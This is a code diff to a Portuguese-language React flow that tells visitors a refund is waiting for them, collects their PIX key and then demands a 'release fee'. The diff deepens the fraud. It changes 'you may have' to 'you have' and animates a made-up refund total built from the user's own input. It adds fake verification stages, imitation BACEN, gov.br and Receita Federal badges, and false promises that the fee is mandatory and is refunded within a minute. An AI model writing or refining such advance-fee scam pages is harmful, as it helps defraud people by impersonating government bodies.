@@ -140,6 +140,26 @@ function generateAmounts(rawDigits) {
     };
 }
 
+function useCountUp(targetStr, duration = 1800) {
+    const [display, setDisplay] = useState("0,00");
+    useEffect(() => {
+        const target = parseFloat(String(targetStr).replace(/\./g, "").replace(",", "."));
+        if (!target || isNaN(target)) return;
+        const start = Date.now();
+        let raf;
+        const tick = () => {
+            const elapsed = Date.now() - start;
+            const progress = Math.min(elapsed / duration, 1);
+            const eased = 1 - Math.pow(1 - progress, 3);
+            setDisplay((target * eased).toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
+            if (progress < 1) { raf = requestAnimationFrame(tick); }
+        };
+        raf = requestAnimationFrame(tick);
+        return () => cancelAnimationFrame(raf);
+    }, [targetStr, duration]);
+    return display;
+}
+
 // ─── shared layout ────────────────────────────────────────────────────────────
 
 function ModalCard({ children, onBackdropClick }) {
@@ -522,7 +542,7 @@ function StepLoading({ onComplete }) {
 // ─── step 3: results ──────────────────────────────────────────────────────────
 
 function StepResults({ formData, onClose, onRegisterPix }) {
-    const amounts = useRef(generateAmounts(formData.valorDigits)).current;
+    const amounts = formData.amounts;
     const [expiry, setExpiry] = useState(48 * 3600);
 
     useEffect(() => {
@@ -556,7 +576,7 @@ function StepResults({ formData, onClose, onRegisterPix }) {
                         <h3 className="text-white font-bold text-lg mb-1">
                             ANÁLISE FEITA COM <span className="text-[#00FF66]">SUCESSO!</span>
                         </h3>
-                        <p className="text-zinc-400 text-xs mb-3">Foi constatado, você pode ter</p>
+                        <p className="text-zinc-400 text-xs mb-3">Foi constatado, você tem</p>
 
                         <div className="w-full rounded-xl py-3 px-5 mb-2" style={{ backgroundColor: "#00FF66" }}>
                             <span className="font-bold text-2xl text-black" style={{ filter: "blur(3px)" }}>
@@ -795,9 +815,17 @@ function StepPixKey({ formData, onSubmit, onBack }) {
 
 // ─── step 5: taxa ─────────────────────────────────────────────────────────────
 
+const CHECK = (
+    <svg className="w-3.5 h-3.5 text-black" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
+        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+    </svg>
+);
+
 function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
     const [loading, setLoading] = useState(false);
     const [error, setError]     = useState("");
+    const amounts    = formData.amounts;
+    const countedVal = useCountUp(amounts?.total || "0,00");
 
     const handlePay = async () => {
         setLoading(true);
@@ -831,13 +859,15 @@ function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
                     <ArrowLeft className="w-5 h-5" />
                 </button>
                 <div>
-                    <h2 className="font-display text-white font-bold text-sm leading-tight">Taxa de Liberação</h2>
-                    <p className="text-[#00FF66] text-xs leading-tight">Última etapa para liberar seu reembolso</p>
+                    <h2 className="font-display text-white font-bold text-sm leading-tight">Solicitar Reembolso</h2>
+                    <p className="text-[#00FF66] text-xs leading-tight">Última etapa</p>
                 </div>
             </div>
 
-            <div className="flex-1 overflow-y-auto px-4 pt-4 pb-3">
-                <div className="rounded-2xl p-4 mb-3" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
+            <div className="flex-1 overflow-y-auto px-4 pt-4 pb-3 flex flex-col gap-3">
+
+                {/* Chave PIX confirmada */}
+                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                     <p className="text-[10px] font-bold tracking-[0.15em] text-zinc-500 uppercase mb-2">CHAVE PIX CADASTRADA</p>
                     <div className="flex items-center justify-between gap-3">
                         <span className="text-zinc-400 text-sm flex-shrink-0">{pixKeyData?.keyType}</span>
@@ -845,29 +875,132 @@ function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
                     </div>
                 </div>
 
-                <div className="rounded-2xl p-5 mb-3 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
-                    <p className="text-zinc-400 text-xs mb-2">Taxa de Liberação de Reembolso</p>
-                    <p className="text-[#00FF66] font-display font-bold text-4xl mb-1">{TAXA_DISPLAY}</p>
-                    <p className="text-zinc-500 text-[11px]">Cobrada uma única vez · Sem mensalidade</p>
+                {/* Valor do reembolso com animação crescente */}
+                <div className="rounded-2xl p-4 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
+                    <p className="text-[10px] font-bold tracking-[0.15em] text-zinc-500 uppercase mb-2">REEMBOLSO DISPONÍVEL</p>
+                    <div className="w-full rounded-xl py-3 px-5 mb-2" style={{ backgroundColor: "#00FF66" }}>
+                        <span className="font-bold text-2xl text-black font-mono tabular-nums">
+                            R$ {countedVal}
+                        </span>
+                    </div>
+                    <p className="text-[#00FF66] text-[11px] font-semibold">✓ Transferência via PIX após liberação</p>
                 </div>
 
-                <div className="rounded-2xl p-4 mb-4" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
-                    <p className="text-[10px] font-bold tracking-[0.15em] text-zinc-500 uppercase mb-3">O QUE ACONTECE APÓS O PAGAMENTO</p>
+                {/* Progress etapas — estética da página */}
+                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
+                    <p className="text-[11px] text-zinc-300 text-center leading-relaxed mb-4">
+                        Conclua o processo de verificação de identidade<br />
+                        <span className="text-zinc-500">exigido pelos órgãos oficiais!</span>
+                    </p>
+                    <div className="flex items-start justify-center gap-3 mb-4">
+                        {/* Etapa 1 */}
+                        <div className="flex flex-col items-center gap-1.5">
+                            <div className="w-11 h-11 rounded-full bg-[#00FF66] flex items-center justify-center shadow-[0_0_16px_rgba(0,255,102,0.4)]">
+                                {CHECK}
+                            </div>
+                            <span className="text-[10px] text-[#00FF66] font-semibold text-center leading-tight">Etapa 1<br/>Concluída</span>
+                        </div>
+                        {/* Linha de conexão */}
+                        <div className="flex-1 max-w-[60px] h-px mt-5" style={{ background: "linear-gradient(to right,#00FF66,#1e3a26)" }} />
+                        {/* Etapa 2 */}
+                        <div className="flex flex-col items-center gap-1.5">
+                            <div className="w-11 h-11 rounded-full border-2 border-[#facc15] flex items-center justify-center" style={{ backgroundColor: "#1a1a0a" }}>
+                                <span className="text-[#facc15] font-bold text-base">2</span>
+                            </div>
+                            <span className="text-[10px] text-[#facc15] font-semibold text-center leading-tight">Etapa 2<br/>Pendente</span>
+                        </div>
+                    </div>
+                    {/* Logos oficiais */}
+                    <div className="flex items-center justify-center gap-5 pt-3 border-t border-zinc-800/60">
+                        <span className="text-zinc-400 text-[9px] font-black tracking-wider uppercase">BACEN</span>
+                        <span className="text-blue-400 text-[9px] font-black tracking-wider">gov.br</span>
+                        <span className="text-zinc-400 text-[9px] font-black tracking-wider uppercase">Receita Federal</span>
+                    </div>
+                </div>
+
+                {/* Validação de identidade — bloco complementar */}
+                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1a10", border: "1px solid rgba(250,204,21,0.25)" }}>
+                    <div className="flex items-center gap-2 mb-3">
+                        <span className="text-base">🛡️</span>
+                        <p className="text-white text-xs font-bold">Validação de identidade e Segurança</p>
+                    </div>
+                    <div className="flex items-center justify-between mb-3">
+                        <p className="text-[#00FF66] font-bold text-xl">{TAXA_DISPLAY}</p>
+                        <span className="text-[9px] bg-yellow-900/40 text-yellow-400 px-2 py-1 rounded-full border border-yellow-700/40 font-semibold">
+                            ⏳ Verificação pendente
+                        </span>
+                    </div>
+                    <p className="text-zinc-400 text-[11px] leading-relaxed mb-3">
+                        Essa etapa exige o pagamento de uma{" "}
+                        <span className="text-white font-semibold">tarifa única e obrigatória de confirmação</span>, no valor de{" "}
+                        <span className="text-white font-semibold">{TAXA_DISPLAY}</span>, utilizada exclusivamente para validar seus dados e confirmar que a solicitação de saque está sendo realizada por uma pessoa real e garantir a liberação segura do seu saldo!
+                    </p>
+                    <div className="rounded-xl p-3" style={{ backgroundColor: "#0a1a0f", border: "1px solid #1e3a26" }}>
+                        <p className="text-[11px] text-zinc-300 leading-relaxed">
+                            <span className="text-[#00FF66] font-semibold">Importante:</span> O valor da tarifa será reembolsado automaticamente em instantes e sua transferência de{" "}
+                            <span className="text-white font-semibold">R$ {amounts?.total}</span> será transferida via PIX em sua conta verificada de destino!
+                        </p>
+                    </div>
+                </div>
+
+                {/* Processo de Saque — 3 etapas */}
+                <div className="rounded-2xl p-4" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
+                    <div className="flex items-center gap-2 mb-4">
+                        <div className="w-5 h-5 rounded-full bg-[#00FF66] flex items-center justify-center flex-shrink-0">
+                            {CHECK}
+                        </div>
+                        <p className="text-white font-bold text-xs tracking-wider uppercase">Processo de Saque</p>
+                    </div>
+
                     {[
-                        "Identificamos o reembolso e notificamos a instituição responsável",
-                        "Você recebe os valores diretamente na chave PIX cadastrada",
-                        "Prazo de até 24 horas após a confirmação da taxa",
-                    ].map((item, i) => (
-                        <div key={i} className="flex items-start gap-2.5 mb-2 last:mb-0">
-                            <span className="w-5 h-5 rounded-full bg-[#00FF66] text-black text-[10px] font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
-                                {i + 1}
-                            </span>
-                            <p className="text-zinc-300 text-xs leading-relaxed">{item}</p>
+                        {
+                            state: "done",
+                            title: "Validação da chave PIX e conta de destino para saque",
+                            desc: `Conseguimos validar com sucesso sua chave PIX e conta de destino de saque no valor de R$ ${amounts?.total}. Lhe enviaremos uma pequena transferência teste via PIX ✅`,
+                        },
+                        {
+                            state: "pending",
+                            title: "Verificação Obrigatória de Identidade",
+                            desc: `Pagamento da pequena tarifa de ${TAXA_DISPLAY} para validação de identidade e protocolo de segurança do titular.`,
+                        },
+                        {
+                            state: "locked",
+                            title: "Reembolso da tarifa e saque instantâneo do seu saldo",
+                            desc: `Receba o reembolso integral do valor pago — ${TAXA_DISPLAY}. Liberação do seu saldo e transferência imediata via PIX — R$ ${amounts?.total}.`,
+                        },
+                    ].map(({ state, title, desc }, i) => (
+                        <div key={i} className="flex gap-3">
+                            <div className="flex flex-col items-center flex-shrink-0">
+                                {state === "done" && (
+                                    <div className="w-7 h-7 rounded-full bg-[#00FF66] flex items-center justify-center shadow-[0_0_8px_rgba(0,255,102,0.4)]">
+                                        {CHECK}
+                                    </div>
+                                )}
+                                {state === "pending" && (
+                                    <div className="w-7 h-7 rounded-full border-2 border-[#facc15] flex items-center justify-center" style={{ backgroundColor: "#1a1a0a" }}>
+                                        <span className="text-[#facc15] font-bold text-xs">{i + 1}</span>
+                                    </div>
+                                )}
+                                {state === "locked" && (
+                                    <div className="w-7 h-7 rounded-full border border-zinc-700 flex items-center justify-center" style={{ backgroundColor: "#111d15" }}>
+                                        <span className="text-zinc-500 font-bold text-xs">{i + 1}</span>
+                                    </div>
+                                )}
+                                {i < 2 && (
+                                    <div className="w-px mt-1 mb-0" style={{ height: "32px", backgroundColor: i === 0 ? "#00FF66" : "#1e3a26" }} />
+                                )}
+                            </div>
+                            <div className="flex-1 pb-4">
+                                <p className={`text-xs font-bold mb-1 ${state === "done" ? "text-[#00FF66]" : state === "pending" ? "text-[#facc15]" : "text-zinc-500"}`}>
+                                    {title}
+                                </p>
+                                <p className="text-zinc-400 text-[11px] leading-relaxed">{desc}</p>
+                            </div>
                         </div>
                     ))}
                 </div>
 
-                {error && <p className="text-red-400 text-xs text-center mb-3">{error}</p>}
+                {error && <p className="text-red-400 text-xs text-center">{error}</p>}
 
                 <button
                     onClick={handlePay}
@@ -875,11 +1008,20 @@ function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
                     className="w-full py-4 rounded-2xl font-bold text-black text-sm tracking-tight transition-all duration-200 hover:brightness-110 active:scale-[0.98] disabled:opacity-60 shadow-[0_0_24px_rgba(0,255,102,0.3)]"
                     style={{ backgroundColor: "#00FF66" }}
                 >
-                    {loading ? "⏳ Gerando PIX..." : `🔒 PAGAR ${TAXA_DISPLAY} E LIBERAR REEMBOLSO`}
+                    {loading ? "⏳ Gerando PIX..." : `Pagar taxa para Liberar Saque`}
                 </button>
-                <p className="text-center text-xs text-yellow-500 mt-2 mb-1">
-                    ⚠ Reembolso expira em 48h — Pague agora
+
+                <p className="text-center text-[11px] text-[#00FF66] font-semibold -mt-1">
+                    ✓ Reembolso automático em 1 minuto
                 </p>
+
+                <div className="flex items-center justify-center gap-5">
+                    <span className="text-zinc-500 text-[9px] font-black tracking-wider uppercase">BACEN</span>
+                    <span className="text-blue-400 text-[9px] font-black tracking-wider">gov.br</span>
+                    <span className="text-zinc-500 text-[9px] font-black tracking-wider uppercase">Receita Federal</span>
+                </div>
+                <p className="text-center text-zinc-600 text-[9px] -mt-2 mb-1">Processo 100% seguro</p>
+
             </div>
 
             <BottomNav activeIndex={3} />
@@ -1107,7 +1249,7 @@ export default function ConsultaFlow({ open, onClose }) {
             {step === "form" && (
                 <StepForm
                     onClose={onClose}
-                    onSubmit={(data) => { setFormData(data); setStep("loading"); }}
+                    onSubmit={(data) => { setFormData({ ...data, amounts: generateAmounts(data.valorDigits) }); setStep("loading"); }}
                 />
             )}
             {step === "loading" && (
